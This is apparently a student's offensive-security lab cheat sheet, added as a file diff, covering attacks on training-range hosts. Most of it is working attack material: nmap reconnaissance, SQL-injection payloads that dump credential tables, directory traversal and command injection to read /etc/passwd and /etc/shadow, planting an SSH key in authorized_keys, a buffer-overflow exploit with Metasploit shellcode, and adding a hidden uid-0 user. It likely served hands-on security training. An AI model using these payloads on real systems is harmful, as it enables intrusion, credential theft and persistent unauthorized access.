@@ -1,0 +1,402 @@
+linops
+ssh -x student@10.50.32.84
+
+winops
+xfreerdp /v:10.50.20.49 /u:student /dynamic-resolution +clipboard
+
+Recon/Scanning 
+1. Host Discovery (Ping Sweep)
+
+              for i in {1..254}; do (ping -c 1 -W 1 192.168.28.$i | grep 'from'&) ;done
+
+2. Host Enumeration (Port Scanning)
+
+              nmap -Pn -T5 192.168.65.20 -p-
+3. Host Interrogration (Service)
+/usr/share/nmap/scripts
+              nmap -T5 -sV 192.168.665.20 -p (ports grabbed from above)
+              nmap -Pn -T5 --script=banner.nse 192.168.65.20 -p 21-23,80 <<<< banner grabs the services
+              nmap -Pn -T5 --script=http-enum.nse IP -p 80 << checks for cool stuff
+              nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP> 
+              nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+              
+              
+   IF SQL INJECTION: GET AND POST METHOD
+   ----------------------------------------------------------------------------------------------------------------------------------
+   GET METHOD: IN THE URL
+   
+     GET METHOD:
+        view the ip changing for each links
+        Good Year: http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
+        Copper: http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
+        Bridgestone: http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
+        General: http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit
+        
+        1. Determine if the webpage is vulnerable via Truth Statement 
+              <value> or 1=1
+              <value> or 1-1;
+              <value> or 1-1; #
+              #CHANGE THE VALUE (IN THIS CASE '4') IF EACH ATTEMPT DOESN'T WORK
+              #YES YOU MIGHT HAVE TO TRY THIS 12 TIMES
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1; 
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1; # << THESE WORK, CONGRATS
+              # DO THESE, IF THEY DON'T WORK, COUNT HIGHER LOL
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3 
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3; 
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3; #
+       2.  Determine the number of columns, order, and hidden 
+           Columns: 3
+           Order: 1,3,2
+           Hidden: N/A
+
+
+
+      3. DEFAULT Golden Statement
+       select table_schema,table_name,column_name 
+        from information_schema.columns
+       
+       information_schema = database, database of information
+       columns = table, table within information_schema
+       
+       table_schema = columns. database names
+       table_name = columns, table names
+       columns_name = columns, column names
+       
+       http://10.50.21.1/uniondemo.php?Selection=4 UNION [GOLDEN STATEMENT]; #
+       
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #
+       
+       #Version and Functions and Filtering
+       @@version
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
+
+      #Functions
+      load_file('/etc/passwd')
+      http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file(/'etc/passwd'); #
+      
+      #Filtering
+      http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns; #
+      http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns WHERE table_schema='session'; #
+   ---------------------------------------------------------------------------------------------------------------------------------------------
+   POST METHOD: SEARCH BAR
+     0. Determine normal behavior (interact with web page)
+       
+        1. Determine if the web page is vulnerable via Truth Statement
+        Truth Statement
+        <Value>'or 1='1
+        <Value>'or 1='1;
+        <Value>'or 1='1; #
+        ONE THE SITE, ALL THE POSSIBLE VALUES WITH ALL POSSIBLE TRUTH STATEMENT, FIND WHAT WORKS
+        Dodge' or 1 ='1 
+        Dodge' or 1 ='1;
+        Dodge' or 1 ='1 #    << THESE DONT
+            
+        Honda' or 1 ='1
+        Honda' or 1 ='1; 
+        Honda' or 1 ='1; # << THESE DONT
+        
+        Audi' or 1 ='1 
+        Audi' or 1 ='1; 
+        Audi' or 1 ='1; # << THESE DO
+        
+        Webpage has 4 columns and 5 rows, found when running this command
+        Pad it, we use UNION select 1,2,3,4 to find how many there are, and the order theyre in
+        Audi' Union select 1,2,3,4    ##count up the the smallest number of possible columns << if this doesn't work use the other variations
+        Audi' Union select 1,2,3,4; 
+        Audi' Union select 1,2,3,4; #  ##<< if these don't work, try the numebr of rows instead 
+       
+        Audi' Union select 1,2,3,4,5 
+        Audi' Union select 1,2,3,4,5; 
+        Audi' Union select 1,2,3,4,5; #  ##<< if this works, that means there's 5 columns on the backend
+                                              columns: 5
+                                              order: 1, 3, 4, 5
+                                              hidden: 2
+                                        
+       DEFAULT Golden Statement
+       select table_schema,table_name,column_name 
+       from information_schema.columns
+       
+       information_schema = database, database of information
+       columns = table, table within information_schema
+       
+       table_schema = columns. database names
+       table_name = columns, table names
+       columns_name = columns, column names
+       
+       Audi' UNION select 1,2,3,4,5; #
+       
+       Audi' UNION select 
+       table_schema,table_name,column_name,1,2 
+       from information_schema.columns; #           << needed to add the 1,2 to match the previously found number of columns   
+       ##This will display 1,2,3,4,5, which is table_schema, table_name, column_name, and padding for the other 2
+       
+       Audi' UNION select
+        table_schema,null,table_name,column_name,1 << null goes in the second spot, because it's hidden
+       from information_schema.columns; #
+       
+       Audi' UNION select studentID,null,username,passwd,null FROM session.userinfo; #
+       --------------------------------------------------------------------------------------------------------------------------
+    
+    Directory Traversal - Info
+    
+    http://10.50.41.203/path/pathdemo.php
+      INSERT THIS INTO THE SEARCH BAR 
+       ../../../../../../../../../../../../../../etc/passwd
+                                                /etc/group
+                                                /etc/hosts
+                                                /etc/networks
+                                                /etc/resolv.conf
+       #This takes you all the way to root and then 
+       cd <= Linux takes you to ~
+       cd .. <= Windows takes you up 1 level 
+       Network Tab > Headers Tab> Query String Parameters
+       myfile <=== Parameter
+       
+       submit <== Parameter
+       
+       WITHOUT A SEARCH BAR:::::
+           http://10.50.41.203/path/pathdemo.php? (? = Query String Parameters)
+           http://10.50.41.203/path/pathdemo.php?myfile=../../../../../../../../../../../../../../../etc/passwd
+           
+--------------------------------------------------------Command Injection - Info/Access
+        ATTEMPT DIRECTORY TRAVERSAL: IT DIDN'T WORK
+              In a search bar: attemp to insert a semicolon followed by a command
+              ex: ; cmd
+                  ; pwd
+                  ; id
+                  ; cat /etc/shadow
+                  ;
+       IF THIS WORKS, MOVE ON TO SSH KEY GEN!
+    -----------------------------------------------------------------------------------------
+                     SSH Keys - Access
+        TLDR: 
+        ### Command injection/SSH Keygen
+        - ;whoami (note user)
+        - ;cat /etc/passwd (note users home dir)
+        - ;cat /etc/host
+        - ; whoami
+        - ; cat /etc/passwd
+        - ; cat /etc/host
+    - SSH keygen
+        - [linops]~$ ssh-keygen -t rsa -b 4096
+        - *enter x2*
+        - [linops]~$ cat id_rsa.pub (copy and paste to notepad)
+        - [www text bar]~$ ;ls -lisa <noted users/home/directory> (MAKE AN .SSH DIR IF NOT SEEN)
+        - [NOTEPAD] echo "<copy paste key>" > /home/notedUser/.ssh/authorized_keys
+        - [www text bar] ; cat /home/notedUser/.ssh/authorized_keys
+    - test [linops] ssh www-data@X.X.X.X
+    -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                    1. Determine who the user is
+                    id
+                    who
+
+                    2. Determine user's home directory
+                    cat /etc/passwd (
+                    find the user's line in etc/passwd
+                      it has the user's home directory and the login shell
+                      
+                    3. generate ssh keys from the workstation from the workstation you will login from
+                          linops:~$ ssh-keygen -t rsa -b 4096 (enter, Y, enter, enter)
+                                    
+                                    cd /home/student/.ssh/
+                                      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCks3Gs+d4sduIXxi0ANQgzoCXw7QbGu6pr6MzeU6q9ggafJI/jrHVgK8n/hm1KmvOm9vmv/5mHZykfVrV2fOuvtsoeIbuNET/bpQqxay38DEWAk+uZOnp4uxI6GhxboYRz9yksFnJhpghBb6y4X9z90OsZQuM8v4Y8dp/EKmJww3XIQUxGgG4Pci+HLyD6HaOGXP+PzghZDjeeEsR61srkV1hRhh+eiWLoHmjkaxXBwSINsVlG1LSnFUZPt00cQdd6zR26zFzsnnxxFNmKxEgeeZi64UJZj9oYeQdyoIrJ8UC6uGlKZK6z6+VbjtKYrk00JK7//fjDl8+B98PzmXzZ+OFVkKmTg9sWSdhYpvO1kiETYMn2gePCPfZfpGnikdq5swC937AHq5V9l+JhcjNarz81qLLJBuHQ+X3adCGuBrqXfZ+Z4hNxdas4XJLdFZF6JMZIjF7Pu1ui09pFRa+vb66Vzjkm8NoqvfAPY7Z+HS9385MWLEH1+soQ6l/y3gONOqx5Tt40gTuwX9k5vudcyg8AVmi0Td0Y47+y1Jye7mGcBLyltwf63svxqM27iZ9EOtvCc28jv6Q4gef5R/WtfFAVzw/Rl6ZO+EWiQzaoAzrSx5tUzrr1rnEIDkBkNTcxbMqwKzViIgzP1KjfF8gRMbWpYpHLhMQEKae066cZRw== student@lin-ops
+                                    ls
+                                    id_rsa = Private key
+                                    id_rsa.pub = Public key <== Key to be uploaded on target machine
+                                    cat id_rsa.pub (COPY THIS SOMEWHERE) #Congrats you just made a public SSH key
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoEn28opKJpPUoxxI/MFFZwDz85ilp39vOpzhL6f975TzJsHBuS2/m/6qvNQsbFkGfnGfMnD8NCdGjb9zzsnPDVIsmPZa2LW0UeCuwzXU0ulzTnBLtK5DbqDrwL0akXvfKLRVEWP80o0rY+oUM7IUbkO0d61YbDpcwxiv/9PGvjp/akt2KWQwf3oJotr/kX48jF8JcX7CqHITYiAAujjetCKYpY5bIXsD2CCx+1t1lP8V/zbjytP8kTdVWTsRX37SrksfVBGrOpnUAtdsY7J9ET3pwXFY/AqJr3JfjL5zUvZn4EsO+7L6tHDW/jM7z4bNdK2Fw2cwdWnOJosGTsz2ctRnl60czpQ4F6w/I6v1BXd6i1l7uL9DdjWnwa1U5GXazQzBAvrqRg5JiVaCECYHO+/DO45W6et4plH3+cC7ff6nQx2ephJE77D3xK2bX5xHjePsc9X3QP9/150zjRaLR3N9YPTXMV8NyFntW5//mkuwxREqwpcc98nXTWRLcU6DbiKUv93auccBDkpW9Cv7VgK8q3c4nA4bjvfModXvdNxtXl3azGu8i3DXle2wBJwhvK8UrQMQTgNFAQwZBiJBoODqUgIW5pDM1SaXEnfyY62PtPeIy3OzjB7R5KLhfOapMhVArsG7h9Mt7i6DrMmaPIGBvpaJfmDYUsIn7bNPsHw== student@lin-ops
+                   4. On the Target Machine, validate directories
+                   Validate .ssh/ exists in user's home directory
+                   ls -la /var/www
+                   (if it doesn't,  make it)
+                   mkdir /home/billybob/.ssh
+                   
+                   5. Upload SSH key to authorized_keys file
+                   echo "" > /home/user/.ssh/authorized_keys
+                   echo "PASTE THE SSH KEY INTO HERE" > /home/user/.ssh/authorized_keys
+ --------------------------------------------------------------------------------------------------------------------------------------------
+ ON A LINUX BOX, DO A sudo -l
+ LINUX BUFFER OVERFLOW GENERIC SCRIPT:
+ #!/usr/bin/python
+#buffer
+buffer = "A" * <minimum overflow from website>
+#eip (place holder)
+eip = "B" * 4
+#nop
+nop = "\x90" * 10
+#shellcode
+print(buffer + eip + nop)
+-------------------------------------------------------
+sudo -l on linux device to find executable
+ if it's only an executable: DO THIS:
+ ex:
+    On the .111 is a function to exploit
+GET TO JUMP BOX
+ ssh localhost -L 31301:10.50.38.249:22
+GET TO .111
+ ssh localhost -p 31301 -L 31302:192.168.28.111:2222
+ 
+GET THE FILE:
+linops:~$  scp -P 31302 comrade@localhost:/.hidden/inventory.exe .
+
+Attempt overflow AKA flood the input with a bunch of A
+ex: 
+  Enter:
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+dmesg | tail -n 5
+segfault at 31634130
+31634130 << put this number into the offset section of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+OFFSET: Whatever you got from the site
+
+FIND THE EXPLOIT NEEDED 
+gdb ./inventory.exe
+pdisass main
+pdisass getTheGoods <<<<<<<<<<<<<<<<<<<<<<< not needed for the overflow script
+CRAFT PACKET: 
+  ##### linux_buffer.py
+#!/usr/bin/python
+
+#buffer
+buffer = "A" * OFFSET NUMBER     
+
+#eip (placeholder)
+eip = "B" * 4
+
+#nop
+nop = "\x90" * 10
+
+#shellcode
+
+print(buffer + eip + nop)
+
+GET SHELLCODE
+msfconsole
+
+use payload/linux/x86/exec
+show options
+set CMD cat /etc/shadow << or whatever command you need to run
+show options
+generate -b "\x00\x20\x0a\x0d" -f python
+
+GET EIP STUFF (DO THIS ON THE MACHINE YOU WANT TO EXPLOIT)
+  env - gdb inventory.exe
+
+    show env
+    unset env LINES
+    unset env COLUMNS
+    show env
+
+
+  run
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    info proc map
+  find /b <startaddr>,<endaddr>,0xff,0xe4
+
+  find /b 0xf7de2000,0xffffe000,0xff,0xe4
+  -First Start Addr under the [heap]
+  -Last End Addr at the [stack]
+  -Copy the first 6 or so over to the script, only use one of them
+  #0xf7f6560f
+#0xf7f65aeb
+#0xf7f65aff
+#0xf7f65d6f
+#0xf7f65f97
+#0xf7f660cf
+#f7 f6 60 cf
+#cf 60 f6 f7
+eip = "\xcf\x60\xf6\xf7"
+
+
+  
+
+
+
+
+buf =  b""
+buf += b"\xbb\xf8\x60\xb4\x3c\xd9\xc2\xd9\x74\x24\xf4\x5f\x33"
+buf += b"\xc9\xb1\x11\x31\x5f\x12\x03\x5f\x12\x83\x3f\x64\x56"
+buf += b"\xc9\xd5\x6e\xce\xab\x7b\x17\x86\xe6\x18\x5e\xb1\x91"
+buf += b"\xf1\x13\x56\x62\x65\xfb\xc4\x0b\x1b\x8a\xea\x9e\x0b"
+buf += b"\x91\xec\x1e\xcb\xc9\x8d\x6a\xeb\x22\x60\xe0\x8e\x5f"
+buf += b"\x0e\x63\x24\x8f\xc0\x1d\xa1\xbd\x65\x91\x4c\x21\xe4"
+buf += b"\x30\xfa\x8b\x78\xdf\x60\xd4\x2f\x4c\xed\x35\x02\xf2"
+
+start 0xf7def000
+finish 0xffffe000 
+
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+0xf7f72c6b
+0xf7f72df7
+0xf7f7307b
+0xf7f7322b
+
+#### $ sudo useradd -ou 0 -g 0 john
+$ sudo passwd john <<<<<<<<<<<<<<<<<<<< how to add a root level user
+
+-----------------------------------------------------------------------------------------------
+POST EXPLOITATION
+Linux Post Ex
+uname -a 	~ shows host info
+ip addr		~ shows ip address, some ip addresses may be open-stack, not target space
+ss -ntlp		~ shows open ports and connections
+find / -name <name> 2>/dev/null
+usr/share/cctc b   
+cat /etc/passwd	~ tells you users on the machine, their home directories, and what type of shell they launch with
+cat /etc/groups	~ tells you what users are a part of which groups
+sudo -l			~ tells you what you can sudo
+cat /etc/shadow	~ need privileges, shows user passwords, they're encrypted though, use john the ripper
+sudo ls -la /root	~ root's home directory, lotta flags gonna be there, need privileges though
+ls -la /etc/*.conf	~ configuration files for services, can find out how certain services are configured
+ls -la /bin		~ user binaries
+ls -la /tmp		~ world-writable directory, any user can use these directories
+ls -la /var/tmp		~ world-writable directory, any user can use this directory
+/etc/networks		~ for network information
+/etc/resolv.conf	~ for DNS information
+/etc/hosts		~ to see if anyone is configured for specific hosts/ip
+crontab -l	~ list jobs for specific user
+/var/spool/cron/crontabs	~ need to have privileges to view crontabs, we shouldn't need to create cronjobs
+cat /etc/crontab	~ do not need privileges to view, scripts are placed in here to be ran
+	~ minute, hour, day of month, month, day of week
+syslog, syslog-ng, rsyslog
+cd /var/log	~ where logs are stored
+/var/log/auth.log	~ where authentication is logged, requires privileges
+Windows Post Ex
+net user /?		~ manage/view user accounts
+net localgroup /?	~ manage user groups or view members of groups
+net localgroup Administrators		~ if we wanted to view users within the 'Administrators' group
+net localgroup "Remote Desktop User"	~ if we wanted to view who is able to use RDP
+dir -hidden OR dir /a:h	~ to view hidden files within the current directory
+dir /R		~ to view alternate data streams on files, if there are any
+where where.exe	~ like 'which' in Linux, finds certain binaries, won't if they aren't a windows environmental variable
+dir | findstr <string>	~ to search for files
+reg query HKU	~ reg query allows us to query into registry locations
+reg query HKLM\Software	~ **USE BACKSLASH, NOT FORWARD SLASH**
+reg query HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN	~ important
+	~ shows what services/processes will run every time the CURRENT USER starts the machine
+reg query HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN OR RUNONCE
+	~ shows what services/processes will start once the machine is started
+		~ RunOnce deletes the key as soon as the command is ran, could find in Application Logs
+tasklist	~ displays a list of currently running processes
+tasklist /svc	~ displays services alongside processes	/v if we want verbose
+query /process	~ queries processes and shows who is running them
+tasklist /svc /fo table <or list>
+sc query /?	~ used for communicating with the Service Control Manager and services
+sc qc <service>	~ shows properties of services, what it's executing
+sc queryex
+ipconfig 	~ shows ip information
+ipconfig /all	~ shows more ip information
+netstat		~ shows open ports and connections
+netstat -ano | findstr /i <port>		~ to view info about specific port
+ipconfig 	~ shows ip information
+ipconfig /all	~ shows more ip information
+netstat		~ shows open ports and connections
+netstat -ano | findstr /i <port>		~ to view info about specific port
+------------------------------------------------------------------------------
+          
+
+
